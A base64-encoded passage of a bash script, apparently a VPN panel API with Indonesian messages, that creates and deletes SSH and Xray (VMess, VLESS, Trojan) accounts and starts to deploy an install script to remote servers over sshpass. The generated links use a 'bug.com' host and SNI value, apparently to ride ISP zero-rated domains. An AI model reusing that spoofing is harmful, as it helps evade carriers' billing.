dCAxOyB9CiAgICBbWyAhICIkdSIgPX4gXlthLXpBLVowLTkuXy1dKyQgXV0gJiYgeyBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiVXNlcm5hbWUgaGFueWEgYm9sZWggaHVydWYsIGFuZ2thLCB0aXRpaywgc3RyaXAsIHVuZGVyc2NvcmUifSc7IGV4aXQgMTsgfQogICAgIyBCbGFja2xpc3Q6IGNlZ2FoIHVzZXJuYW1lIHN5c3RlbQogICAgZm9yIHJlc2VydmVkIGluIHJvb3QgYWRtaW4gd3d3LWRhdGEgbm9ib2R5IGRhZW1vbiBiaW4gc3lzIHN5bmMgZ2FtZXMgbWFuIGxwIG1haWwgbmV3cyB1dWNwIHByb3h5IGJhY2t1cCBsaXN0IGlyYyBnbmF0cyBteXNxbCBwb3N0Z3JlczsgZG8KICAgICAgICBbWyAiJHt1LCx9IiA9PSAiJHJlc2VydmVkIiBdXSAmJiB7IGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJVc2VybmFtZSB0ZXJsYXJhbmcgKHJlc2VydmVkIHN5c3RlbSkifSc7IGV4aXQgMTsgfQogICAgZG9uZQogICAgcmV0dXJuIDAKfQoKdmFsaWRhdGVfZGF5cygpIHsKICAgIGxvY2FsIGQ9IiQxIgogICAgW1sgISAiJGQiID1+IF5bMC05XSskIF1dICYmIHsgZWNobyAneyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkR1cmFzaSBoYXJ1cyBhbmdrYSJ9JzsgZXhpdCAxOyB9CiAgICBbWyAkZCAtbHQgMSB8fCAkZCAtZ3QgMzY1IF1dICYmIHsgZWNobyAneyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkR1cmFzaSAxLTM2NSBoYXJpIn0nOyBleGl0IDE7IH0KICAgIHJldHVybiAwCn0KCnZhbGlkYXRlX3F1b3RhKCkgewogICAgbG9jYWwgcT0iJDEiCiAgICBbWyAhICIkcSIgPX4gXlswLTldKyQgXV0gJiYgeyBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiUXVvdGEgaGFydXMgYW5na2EifSc7IGV4aXQgMTsgfQogICAgW1sgJHEgLWx0IDEgfHwgJHEgLWd0IDEwMCBdXSAmJiB7IGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJRdW90YSAxLTEwMCBHQiJ9JzsgZXhpdCAxOyB9CiAgICByZXR1cm4gMAp9Cgp2YWxpZGF0ZV9pcGxpbWl0KCkgewogICAgbG9jYWwgaT0iJDEiCiAgICBbWyAhICIkaSIgPX4gXlswLTldKyQgXV0gJiYgeyBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiSVAgTGltaXQgaGFydXMgYW5na2EifSc7IGV4aXQgMTsgfQogICAgW1sgJGkgLWx0IDEgfHwgJGkgLWd0IDUgXV0gJiYgeyBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiSVAgTGltaXQgMS01In0nOyBleGl0IDE7IH0KICAgIHJldHVybiAwCn0KCiMgPT09IFJBVEUgTElNSVRJTkcgKG1heCAxMCBjcmVhdGVzIHBlciBob3VyKSA9PT0KY2hlY2tfcmF0ZV9saW1pdCgpIHsKCiAgICAgICAgIyA9PT0gTVVMVEktVlBTOiBSZWRpcmVjdCBrZSByZW1vdGUgc2VydmVyIGppa2EgLS1zZXJ2ZXIgZGlndW5ha2FuID09PQogICAgICAgIGlmIFtbIC1uICIkU0VSVkVSX0NPREUiIF1dOyB0aGVuCiAgICAgICAgICAgIHJlbW90ZV9leGVjICIkU0VSVkVSX0NPREUiICIkQUNUSU9OIiAiJFBST1RPQ09MIiAiJFVTRVJOQU1FIiAiJERBWVMiICIkUVVPVEEiICIkSVBMSU1JVCIKICAgICAgICAgICAgZXhpdCAkPwogICAgICAgIGZpCiAgICBta2RpciAtcCAiJFJMX0RJUiIgMj4vZGV2L251bGwgfHwgcmV0dXJuIDEKICAgIGxvY2FsIG5vdz0kKGRhdGUgKyVzKQogICAgbG9jYWwgb25lX2hvdXJfYWdvPSQoKG5vdyAtIDM2MDApKQogICAgbG9jYWwgY291bnQ9MAogICAgIyBDbGVhbiBvbGQgZW50cmllcyAmIGNvdW50IHJlY2VudAogICAgZm9yIGYgaW4gIiRSTF9ESVIiL2NyZWF0ZS0qOyBkbwogICAgICAgIFtbIC1mICIkZiIgXV0gfHwgY29udGludWUKICAgICAgICBsb2NhbCB0cz0kKHN0YXQgLWMgJVkgIiRmIiAyPi9kZXYvbnVsbCB8fCBlY2hvIDApCiAgICAgICAgaWYgW1sgJHRzIC1sdCAkb25lX2hvdXJfYWdvIF1dOyB0aGVuCiAgICAgICAgICAgIHJtIC1mICIkZiIgMj4vZGV2L251bGwKICAgICAgICBlbHNlCiAgICAgICAgICAgICgoY291bnQrKykpCiAgICAgICAgZmkKICAgIGRvbmUKICAgIGlmIFtbICRjb3VudCAtZ2UgMTAgXV07IHRoZW4KICAgICAgICBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiUmF0ZSBsaW1pdDogbWFrcyAxMCBjcmVhdGUgcGVyIGphbSJ9JwogICAgICAgIGxvZ19ldmVudCAwICJSQVRFX0xJTUlUX0VYQ0VFREVEIgogICAgICAgIGV4aXQgMQogICAgZmkKICAgICMgUmVjb3JkIHRoaXMgYXR0ZW1wdAogICAgdG91Y2ggIiRSTF9ESVIvY3JlYXRlLSRub3ctJCQiIDI+L2Rldi9udWxsIHx8IHRydWUKICAgIHJldHVybiAwCn0KCiMgPT09IFhSQVkgQ09ORklHIExPQ0sgPT09CmFjcXVpcmVfY29uZmlnX2xvY2soKSB7CiAgICBleGVjIDIwMD4iJENPTkZJR19MT0NLIgogICAgaWYgISBmbG9jayAtdyAxMCAyMDAgMj4vZGV2L251bGw7IHRoZW4KICAgICAgICBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiVGltZW91dDogY29uZmlnIFhyYXkgc2VkYW5nIGRpa3VuY2kifScKICAgICAgICBsb2dfZXZlbnQgMCAiTE9DS19USU1FT1VUIgogICAgICAgIGV4aXQgMQogICAgZmkKfQoKcmVsZWFzZV9jb25maWdfbG9jaygpIHsKICAgIGZsb2NrIC11IDIwMCAyPi9kZXYvbnVsbCB8fCB0cnVlCn0KCiMgPT09IE1BSU4gPT09CmNhc2UgIiRBQ1RJT04iIGluCiAgICBjcmVhdGUpCiAgICAgICAgIyBWYWxpZGF0ZSBwcm90b2NvbCB3aGl0ZWxpc3QKICAgICAgICBbWyAhICIkUFJPVE9DT0wiID1+IF4oc3NofHZtZXNzfHZsZXNzfHRyb2phbikkIF1dICYmIHsgZWNobyAneyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IlByb3RvY29sIHRpZGFrIGRpa2VuYWwifSc7IGxvZ19ldmVudCAwICJJTlZBTElEX1BST1RPQ09MIjsgZXhpdCAxOyB9CiAgICAgICAgdmFsaWRhdGVfdXNlcm5hbWUgIiRVU0VSTkFNRSIKICAgICAgICB2YWxpZGF0ZV9kYXlzICIkREFZUyIKICAgICAgICB2YWxpZGF0ZV9xdW90YSAiJFFVT1RBIgogICAgICAgIHZhbGlkYXRlX2lwbGltaXQgIiRJUExJTUlUIgogICAgICAgIGNoZWNrX3JhdGVfbGltaXQKCiAgICAgICAgIyBEdXBsaWNhdGUgY2hlY2s6IGNlZ2FoIGFrdW4gZGVuZ2FuIG5hbWEgc2FtYQogICAgICAgIGlmIFtbIC1mICIkQUtVTl9ESVIvJHtQUk9UT0NPTH0tJHtVU0VSTkFNRX0udHh0IiBdXTsgdGhlbgogICAgICAgICAgICBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiQWt1biBzdWRhaCBhZGEhIEhhcHVzIGR1bHUgYXRhdSBwYWthaSB1c2VybmFtZSBsYWluLiJ9JwogICAgICAgICAgICBsb2dfZXZlbnQgMCAiRFVQTElDQVRFX0VYSVNUUyIKICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgZmkKICAgICAgICBpZiBbWyAiJFBST1RPQ09MIiA9PSAic3NoIiBdXSAmJiBpZCAiJFVTRVJOQU1FIiAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiVXNlciBzaXN0ZW0gc3VkYWggYWRhISJ9JwogICAgICAgICAgICBsb2dfZXZlbnQgMCAiRFVQTElDQVRFX1NZU1RFTV9VU0VSIgogICAgICAgICAgICBleGl0IDEKICAgICAgICBmaQoKICAgICAgICBVVUlEPSQoY2F0IC9wcm9jL3N5cy9rZXJuZWwvcmFuZG9tL3V1aWQpCiAgICAgICAgRVhQPSQoZGF0ZSAtZCAiKyR7REFZU30gZGF5cyIgKyIlZCAlYiwgJVkiKTsgQ1JFQVRFRD0kKGRhdGUgKyIlZCAlYiwgJVkiKQogICAgICAgIElQX1ZQUz0kKGN1cmwgLXMgLS1tYXgtdGltZSA1IGlmY29uZmlnLm1lIDI+L2Rldi9udWxsIHx8IGhvc3RuYW1lIC1JIHwgYXdrICd7cHJpbnQgJDF9JykKICAgICAgICBET01BSU49JChjYXQgL3Jvb3QvZG9tYWluIDI+L2Rldi9udWxsIHwgdHIgLWQgJ1xuXHInIHwgeGFyZ3MpCiAgICAgICAgW1sgLXogIiRET01BSU4iIF1dICYmIERPTUFJTj0iJChob3N0bmFtZSAtSSB8IGF3ayAne3ByaW50ICQxfScpIgoKICAgICAgICBpZiBbWyAiJFBST1RPQ09MIiA9PSAic3NoIiBdXTsgdGhlbgogICAgICAgICAgICBFWFBfREFURT0kKGRhdGUgLWQgIiske0RBWVN9IGRheXMiICsiJVktJW0tJWQiKQogICAgICAgICAgICB1c2VyYWRkIC1NIC1zIC9iaW4vZmFsc2UgLWUgIiRFWFBfREFURSIgIiRVU0VSTkFNRSIgMj4vZGV2L251bGwgfHwgewogICAgICAgICAgICAgICAgZWNobyAneyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkdhZ2FsIG1lbWJ1YXQgdXNlciBTU0ggKG11bmdraW4gc3VkYWggYWRhKSJ9JwogICAgICAgICAgICAgICAgbG9nX2V2ZW50IDAgIlNTSF9VU0VSQUREX0ZBSUxFRCIKICAgICAgICAgICAgICAgIGV4aXQgMQogICAgICAgICAgICB9CiAgICAgICAgICAgIFBBU1NXT1JEPSIke1VVSUQ6MDoxMn0iCiAgICAgICAgICAgIGVjaG8gIiR7VVNFUk5BTUV9OiR7UEFTU1dPUkR9IiB8IGNocGFzc3dkIDI+L2Rldi9udWxsCiAgICAgICAgICAgIG1rZGlyIC1wICIkQUtVTl9ESVIiCiAgICAgICAgICAgIHByaW50ZiAiVVVJRD0lc1xuUVVPVEE9JXNcbklQTElNSVQ9JXNcbkVYUElSRUQ9JXNcbkNSRUFURUQ9JXNcbiIgIiRQQVNTV09SRCIgIiRRVU9UQSIgIiRJUExJTUlUIiAiJEVYUCIgIiRDUkVBVEVEIiA+ICIkQUtVTl9ESVIvc3NoLSR7VVNFUk5BTUV9LnR4dCIKICAgICAgICAgICAgbG9nX2V2ZW50IDEgIlNTSF9DUkVBVEVEIgogICAgICAgICAgICBlY2hvICJ7InN1Y2Nlc3MiOnRydWUsInByb3RvY29sIjoic3NoIiwidXNlcm5hbWUiOiIke1VTRVJOQU1FfSIsInBhc3N3b3JkIjoiJHtQQVNTV09SRH0iLCJpcCI6IiR7SVBfVlBTfSIsImRvbWFpbiI6IiR7RE9NQUlOfSIsImV4cGlyZWQiOiIke0VYUH0iLCJsaW5rX2NvbmZpZyI6InNzaDovLyIsInV1aWQiOiIke1BBU1NXT1JEfSJ9IgogICAgICAgICAgICBleGl0IDAKICAgICAgICBmaQoKICAgICAgICAjIFByb3RvY29sIHNlbGFpbiBTU0g6IG1vZGlmaWthc2kgWHJheSBjb25maWcKICAgICAgICBhY3F1aXJlX2NvbmZpZ19sb2NrCiAgICAgICAgVEVNUD0kKG1rdGVtcCkKICAgICAgICBpZiBbWyAiJFBST1RPQ09MIiA9PSAidm1lc3MiIF1dOyB0aGVuCiAgICAgICAgICAgIGpxIC0tYXJnIHV1aWQgIiRVVUlEIiAtLWFyZyBlbWFpbCAiJFVTRVJOQU1FIiAnKC5pbmJvdW5kc1tdfHNlbGVjdCgudGFnfHN0YXJ0c3dpdGgoInZtZXNzIikpLnNldHRpbmdzLmNsaWVudHMpKz1beyJpZCI6JHV1aWQsImVtYWlsIjokZW1haWwsImFsdGVySWQiOjB9XScgIiRYUkFZX0NPTkZJRyIgPiAiJFRFTVAiIDI+L2Rldi9udWxsCiAgICAgICAgZWxpZiBbWyAiJFBST1RPQ09MIiA9PSAidmxlc3MiIF1dOyB0aGVuCiAgICAgICAgICAgIGpxIC0tYXJnIHV1aWQgIiRVVUlEIiAtLWFyZyBlbWFpbCAiJFVTRVJOQU1FIiAnKC5pbmJvdW5kc1tdfHNlbGVjdCgudGFnfHN0YXJ0c3dpdGgoInZsZXNzIikpLnNldHRpbmdzLmNsaWVudHMpKz1beyJpZCI6JHV1aWQsImVtYWlsIjokZW1haWx9XScgIiRYUkFZX0NPTkZJRyIgPiAiJFRFTVAiIDI+L2Rldi9udWxsCiAgICAgICAgZWxpZiBbWyAiJFBST1RPQ09MIiA9PSAidHJvamFuIiBdXTsgdGhlbgogICAgICAgICAgICBqcSAtLWFyZyBwYXNzd29yZCAiJFVVSUQiIC0tYXJnIGVtYWlsICIkVVNFUk5BTUUiICcoLmluYm91bmRzW118c2VsZWN0KC50YWd8c3RhcnRzd2l0aCgidHJvamFuIikpLnNldHRpbmdzLmNsaWVudHMpKz1beyJwYXNzd29yZCI6JHBhc3N3b3JkLCJlbWFpbCI6JGVtYWlsfV0nICIkWFJBWV9DT05GSUciID4gIiRURU1QIiAyPi9kZXYvbnVsbAogICAgICAgIGVsc2UKICAgICAgICAgICAgcm0gLWYgIiRURU1QIgogICAgICAgICAgICByZWxlYXNlX2NvbmZpZ19sb2NrCiAgICAgICAgICAgIGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJQcm90b2NvbCB0aWRhayBkaWtlbmFsIn0nCiAgICAgICAgICAgIGxvZ19ldmVudCAwICJVTktOT1dOX1BST1RPQ09MIgogICAgICAgICAgICBleGl0IDEKICAgICAgICBmaQoKICAgICAgICBbWyAhIC1zICIkVEVNUCIgXV0gJiYgeyBybSAtZiAiJFRFTVAiOyByZWxlYXNlX2NvbmZpZ19sb2NrOyBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiR2FnYWwgdXBkYXRlIFhyYXkgY29uZmlnIn0nOyBsb2dfZXZlbnQgMCAiSlFfRkFJTEVEIjsgZXhpdCAxOyB9CiAgICAgICAganEgZW1wdHkgIiRURU1QIiAyPi9kZXYvbnVsbCB8fCB7IHJtIC1mICIkVEVNUCI7IHJlbGVhc2VfY29uZmlnX2xvY2s7IGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJKU09OIHRpZGFrIHZhbGlkIn0nOyBsb2dfZXZlbnQgMCAiSU5WQUxJRF9KU09OIjsgZXhpdCAxOyB9CiAgICAgICAgbXYgIiRURU1QIiAiJFhSQVlfQ09ORklHIjsgY2htb2QgNjQ0ICIkWFJBWV9DT05GSUciCiAgICAgICAgaWYgISB4cmF5IC10ZXN0IC1jb25maWcgIiRYUkFZX0NPTkZJRyIgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgICAgIHJlbGVhc2VfY29uZmlnX2xvY2sKICAgICAgICAgICAgZWNobyAneyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IlhyYXkgY29uZmlnIHRlc3QgZ2FnYWwifScKICAgICAgICAgICAgbG9nX2V2ZW50IDAgIlhSQVlfVEVTVF9GQUlMRUQiCiAgICAgICAgICAgIGV4aXQgMQogICAgICAgIGZpCiAgICAgICAgc3lzdGVtY3RsIHJlc3RhcnQgeHJheSA+L2Rldi9udWxsIDI+JjE7IHNsZWVwIDEKICAgICAgICByZWxlYXNlX2NvbmZpZ19sb2NrCgogICAgICAgIG1rZGlyIC1wICIkQUtVTl9ESVIiCiAgICAgICAgcHJpbnRmICJVVUlEPSVzXG5RVU9UQT0lc1xuSVBMSU1JVD0lc1xuRVhQSVJFRD0lc1xuQ1JFQVRFRD0lc1xuIiAiJFVVSUQiICIkUVVPVEEiICIkSVBMSU1JVCIgIiRFWFAiICIkQ1JFQVRFRCIgPiAiJEFLVU5fRElSLyR7UFJPVE9DT0x9LSR7VVNFUk5BTUV9LnR4dCIKCiAgICAgICAgIyBHZW5lcmF0ZSBsaW5rcwogICAgICAgIGlmIFtbICIkUFJPVE9DT0wiID09ICJ2bWVzcyIgXV07IHRoZW4KICAgICAgICAgICAgSl9UTFM9JChwcmludGYgJ3sidiI6IjIiLCJwcyI6IiVzIiwiYWRkIjoiYnVnLmNvbSIsInBvcnQiOiI0NDMiLCJpZCI6IiVzIiwiYWlkIjoiMCIsIm5ldCI6IndzIiwicGF0aCI6Ii92bWVzcyIsInR5cGUiOiJub25lIiwiaG9zdCI6IiVzIiwidGxzIjoidGxzIn0nICIkVVNFUk5BTUUiICIkVVVJRCIgIiRET01BSU4iKQogICAgICAgICAgICBMSU5LX1RMUz0idm1lc3M6Ly8kKHByaW50ZiAnJXMnICIkSl9UTFMifGJhc2U2NCAtdyAwKSIKICAgICAgICAgICAgSl9OT05UTFM9JChwcmludGYgJ3sidiI6IjIiLCJwcyI6IiVzIiwiYWRkIjoiYnVnLmNvbSIsInBvcnQiOiI4MCIsImlkIjoiJXMiLCJhaWQiOiIwIiwibmV0Ijoid3MiLCJwYXRoIjoiL3ZtZXNzIiwidHlwZSI6Im5vbmUiLCJob3N0IjoiJXMiLCJ0bHMiOiJub25lIn0nICIkVVNFUk5BTUUiICIkVVVJRCIgIiRET01BSU4iKQogICAgICAgICAgICBMSU5LX05PTlRMUz0idm1lc3M6Ly8kKHByaW50ZiAnJXMnICIkSl9OT05UTFMifGJhc2U2NCAtdyAwKSIKICAgICAgICAgICAgSl9HUlBDPSQocHJpbnRmICd7InYiOiIyIiwicHMiOiIlcyIsImFkZCI6IiVzIiwicG9ydCI6IjQ0MyIsImlkIjoiJXMiLCJhaWQiOiIwIiwibmV0IjoiZ3JwYyIsInBhdGgiOiJ2bWVzcy1ncnBjIiwidHlwZSI6Im5vbmUiLCJob3N0IjoiYnVnLmNvbSIsInRscyI6InRscyJ9JyAiJFVTRVJOQU1FIiAiJERPTUFJTiIgIiRVVUlEIikKICAgICAgICAgICAgTElOS19HUlBDPSJ2bWVzczovLyQocHJpbnRmICclcycgIiRKX0dSUEMifGJhc2U2NCAtdyAwKSIKICAgICAgICBlbGlmIFtbICIkUFJPVE9DT0wiID09ICJ2bGVzcyIgXV07IHRoZW4KICAgICAgICAgICAgTElOS19UTFM9InZsZXNzOi8vJHtVVUlEfUBidWcuY29tOjQ0Mz9wYXRoPSUyRnZsZXNzJnNlY3VyaXR5PXRscyZlbmNyeXB0aW9uPW5vbmUmaG9zdD0ke0RPTUFJTn0mdHlwZT13cyZzbmk9JHtET01BSU59IyR7VVNFUk5BTUV9LVRMUyIKICAgICAgICAgICAgTElOS19OT05UTFM9InZsZXNzOi8vJHtVVUlEfUBidWcuY29tOjgwP3BhdGg9JTJGdmxlc3Mmc2VjdXJpdHk9bm9uZSZlbmNyeXB0aW9uPW5vbmUmaG9zdD0ke0RPTUFJTn0mdHlwZT13cyMke1VTRVJOQU1FfS1Ob25UTFMiCiAgICAgICAgICAgIExJTktfR1JQQz0idmxlc3M6Ly8ke1VVSUR9QCR7RE9NQUlOfTo0NDM/bW9kZT1ndW4mc2VjdXJpdHk9dGxzJmVuY3J5cHRpb249bm9uZSZ0eXBlPWdycGMmc2VydmljZU5hbWU9dmxlc3MtZ3JwYyZzbmk9YnVnLmNvbSMke1VTRVJOQU1FfS1nUlBDIgogICAgICAgIGVsaWYgW1sgIiRQUk9UT0NPTCIgPT0gInRyb2phbiIgXV07IHRoZW4KICAgICAgICAgICAgTElOS19UTFM9InRyb2phbjovLyR7VVVJRH1AYnVnLmNvbTo0NDM/cGF0aD0lMkZ0cm9qYW4mc2VjdXJpdHk9dGxzJmhvc3Q9JHtET01BSU59JnR5cGU9d3Mmc25pPSR7RE9NQUlOfSMke1VTRVJOQU1FfS1UTFMiCiAgICAgICAgICAgIExJTktfTk9OVExTPSJ0cm9qYW46Ly8ke1VVSUR9QGJ1Zy5jb206ODA/cGF0aD0lMkZ0cm9qYW4mc2VjdXJpdHk9bm9uZSZob3N0PSR7RE9NQUlOfSZ0eXBlPXdzIyR7VVNFUk5BTUV9LU5vblRMUyIKICAgICAgICAgICAgTElOS19HUlBDPSJ0cm9qYW46Ly8ke1VVSUR9QCR7RE9NQUlOfTo0NDM/bW9kZT1ndW4mc2VjdXJpdHk9dGxzJnR5cGU9Z3JwYyZzZXJ2aWNlTmFtZT10cm9qYW4tZ3JwYyZzbmk9YnVnLmNvbSMke1VTRVJOQU1FfS1nUlBDIgogICAgICAgIGZpCgogICAgICAgIGxvZ19ldmVudCAxICIke1BST1RPQ09MXl59X0NSRUFURUQiCiAgICAgICAgcHJpbnRmICd7InN1Y2Nlc3MiOnRydWUsInByb3RvY29sIjoiJXMiLCJ1c2VybmFtZSI6IiVzIiwidXVpZCI6IiVzIiwiaXAiOiIlcyIsImRvbWFpbiI6IiVzIiwiZXhwaXJlZCI6IiVzIiwibGlua190bHMiOiIlcyIsImxpbmtfbm9udGxzIjoiJXMiLCJsaW5rX2dycGMiOiIlcyIsImRvd25sb2FkIjoiaHR0cDovLyVzOjgxLyVzLSVzLnR4dCJ9XG4nIFwKICAgICAgICAgICAgIiRQUk9UT0NPTCIgIiRVU0VSTkFNRSIgIiRVVUlEIiAiJElQX1ZQUyIgIiRET01BSU4iICIkRVhQIiAiJExJTktfVExTIiAiJExJTktfTk9OVExTIiAiJExJTktfR1JQQyIgIiRJUF9WUFMiICIkUFJPVE9DT0wiICIkVVNFUk5BTUUiCiAgICAgICAgZXhpdCAwIDs7CgogICAgZGVsZXRlKQoKICAgICAgICAjID09PSBNVUxUSS1WUFM6IFJlZGlyZWN0IGRlbGV0ZSBrZSByZW1vdGUgPT09CiAgICAgICAgaWYgW1sgLW4gIiRTRVJWRVJfQ09ERSIgXV07IHRoZW4KICAgICAgICAgICAgcmVtb3RlX2V4ZWMgIiRTRVJWRVJfQ09ERSIgIiRBQ1RJT04iICIkUFJPVE9DT0wiICIkVVNFUk5BTUUiICIwIiAiMCIgIjAiCiAgICAgICAgICAgIGV4aXQgJD8KICAgICAgICBmaQogICAgICAgIHZhbGlkYXRlX3VzZXJuYW1lICIkVVNFUk5BTUUiCiAgICAgICAgW1sgLXogIiRQUk9UT0NPTCIgXV0gJiYgeyBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiUHJvdG9jb2wgd2FqaWIgZGlpc2kifSc7IGV4aXQgMTsgfQoKICAgICAgICBpZiBbWyAiJFBST1RPQ09MIiA9PSAic3NoIiBdXTsgdGhlbgogICAgICAgICAgICB1c2VyZGVsICIkVVNFUk5BTUUiIDI+L2Rldi9udWxsCiAgICAgICAgZWxzZQogICAgICAgICAgICBhY3F1aXJlX2NvbmZpZ19sb2NrCiAgICAgICAgICAgIFRFTVA9JChta3RlbXApCiAgICAgICAgICAgIGpxIC0tYXJnIGVtYWlsICIkVVNFUk5BTUUiICdkZWwoLmluYm91bmRzW10uc2V0dGluZ3MuY2xpZW50c1tdP3xzZWxlY3QoLmVtYWlsPT0kZW1haWwpKScgIiRYUkFZX0NPTkZJRyIgPiAiJFRFTVAiIDI+L2Rldi9udWxsCiAgICAgICAgICAgIGlmIFtbIC1zICIkVEVNUCIgXV0gJiYganEgZW1wdHkgIiRURU1QIiAyPi9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICAgICAgaWYgeHJheSAtdGVzdCAtY29uZmlnICIkVEVNUCIgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbXYgIiRURU1QIiAiJFhSQVlfQ09ORklHIgogICAgICAgICAgICAgICAgICAgIHN5c3RlbWN0bCByZXN0YXJ0IHhyYXkgPi9kZXYvbnVsbCAyPiYxCiAgICAgICAgICAgICAgICBlbHNlIHJtIC1mICIkVEVNUCI7IGZpCiAgICAgICAgICAgIGVsc2Ugcm0gLWYgIiRURU1QIjsgZmkKICAgICAgICAgICAgcmVsZWFzZV9jb25maWdfbG9jawogICAgICAgIGZpCiAgICAgICAgcm0gLWYgIiRBS1VOX0RJUi8ke1BST1RPQ09MfS0ke1VTRVJOQU1FfS50eHQiICIkUFVCTElDX0hUTUwvJHtQUk9UT0NPTH0tJHtVU0VSTkFNRX0udHh0IgogICAgICAgIGxvZ19ldmVudCAxICIke1BST1RPQ09MXl59X0RFTEVURUQiCiAgICAgICAgZWNobyAneyJzdWNjZXNzIjp0cnVlLCJtZXNzYWdlIjoiQWt1biBiZXJoYXNpbCBkaWhhcHVzIn0nIDs7CgogICAgc3RhdHVzKQogICAgICAgIHByaW50ZiAneyJ4cmF5IjoiJXMiLCJuZ2lueCI6IiVzIiwiaGFwcm94eSI6IiVzIiwiZG9tYWluIjoiJXMiLCJpcCI6IiVzIn1cbicgXAogICAgICAgICAgICAiJChzeXN0ZW1jdGwgaXMtYWN0aXZlIHhyYXkgMj4vZGV2L251bGwpIiAiJChzeXN0ZW1jdGwgaXMtYWN0aXZlIG5naW54IDI+L2Rldi9udWxsKSIgXAogICAgICAgICAgICAiJChzeXN0ZW1jdGwgaXMtYWN0aXZlIGhhcHJveHkgMj4vZGV2L251bGwpIiBcCiAgICAgICAgICAgICIkKGNhdCAvcm9vdC9kb21haW4gMj4vZGV2L251bGx8dHIgLWQgJ1xuXHInfHhhcmdzKSIgXAogICAgICAgICAgICAiJChjdXJsIC1zIC0tbWF4LXRpbWUgNSBpZmNvbmZpZy5tZSAyPi9kZXYvbnVsbHx8aG9zdG5hbWUgLUl8YXdrICd7cHJpbnQgJDF9JykiIDs7CgogICAgbGlzdCkKICAgICAgICBbWyAteiAiJFBST1RPQ09MIiBdXSAmJiBQUk9UT0NPTD0iKiI7IGVjaG8gIlsiOyBGSVJTVD0xOyBzaG9wdCAtcyBudWxsZ2xvYgogICAgICAgIGZvciBmIGluICIkQUtVTl9ESVIiLyR7UFJPVE9DT0x9LSoudHh0OyBkbwogICAgICAgICAgICBbWyAhIC1mICIkZiIgXV0gJiYgY29udGludWUKICAgICAgICAgICAgRk5BTUU9JChiYXNlbmFtZSAiJGYiIC50eHQpOyBQUk9UTz0iJHtGTkFNRSUlLSp9IjsgVU5BTUU9IiR7Rk5BTUUjKi19IgogICAgICAgICAgICBFWFBfSU5GTz0kKGdyZXAgIkVYUElSRUQ9IiAiJGYiIDI+L2Rldi9udWxsfGN1dCAtZD0gLWYyLSkKICAgICAgICAgICAgVVVJRF9JTkZPPSQoZ3JlcCAiVVVJRD0iICIkZiIgMj4vZGV2L251bGx8Y3V0IC1kPSAtZjItKQogICAgICAgICAgICBbWyAkRklSU1QgLWVxIDAgXV0gJiYgZWNobyAiLCIKICAgICAgICAgICAgcHJpbnRmICd7InByb3RvY29sIjoiJXMiLCJ1c2VybmFtZSI6IiVzIiwiZXhwaXJlZCI6IiVzIiwidXVpZCI6IiVzIn0nICIkUFJPVE8iICIkVU5BTUUiICIkRVhQX0lORk8iICIkVVVJRF9JTkZPIgogICAgICAgICAgICBGSVJTVD0wCiAgICAgICAgZG9uZTsgc2hvcHQgLXUgbnVsbGdsb2I7IGVjaG8gIiI7IGVjaG8gIl0iIDs7CgoKICAgIHByb2JlfGRpc2NvdmVyKQogICAgICAgICMgPT09PT0gQVVUTy1ERVRFQ1QgUkVNT1RFIFZQUyA9PT09PQogICAgICAgICMgVXNhZ2U6IHZwbi1hcGkgcHJvYmUgPGlwPiA8dXNlcj4gPHBhc3N3b3JkPiBbcG9ydF0KICAgICAgICB0YXJnZXRfaXA9IiQyIiB0YXJnZXRfdXNlcj0iJDMiIHRhcmdldF9wYXNzPSIkNCIgdGFyZ2V0X3BvcnQ9IiR7NTotMjJ9IgogICAgICAgICMgVmFsaWRhdGUgcG9ydAogICAgICAgIFtbICEgIiR0YXJnZXRfcG9ydCIgPX4gXlswLTldKyQgfHwgIiR0YXJnZXRfcG9ydCIgLWx0IDEgfHwgIiR0YXJnZXRfcG9ydCIgLWd0IDY1NTM1IF1dICYmIHRhcmdldF9wb3J0PTIyCiAgICAgICAgaWYgW1sgLXogIiR0YXJnZXRfaXAiIHx8IC16ICIkdGFyZ2V0X3VzZXIiIHx8IC16ICIkdGFyZ2V0X3Bhc3MiIF1dOyB0aGVuCiAgICAgICAgICAgIGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJVc2FnZTogdnBuLWFwaSBwcm9iZSA8aXA+IDx1c2VyPiA8cGFzc3dvcmQ+IFtwb3J0XSJ9JwogICAgICAgICAgICBleGl0IDEKICAgICAgICBmaQogICAgICAgICMgSW5zdGFsbCBzc2hwYXNzIGlmIG5lZWRlZAogICAgICAgIGNvbW1hbmQgLXYgc3NocGFzcyA+L2Rldi9udWxsIDI+JjEgfHwgYXB0LWdldCBpbnN0YWxsIC15IHNzaHBhc3MgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKICAgICAgICAjIERlcGxveSBpbnN0YWxsLXJlbW90ZS5zaC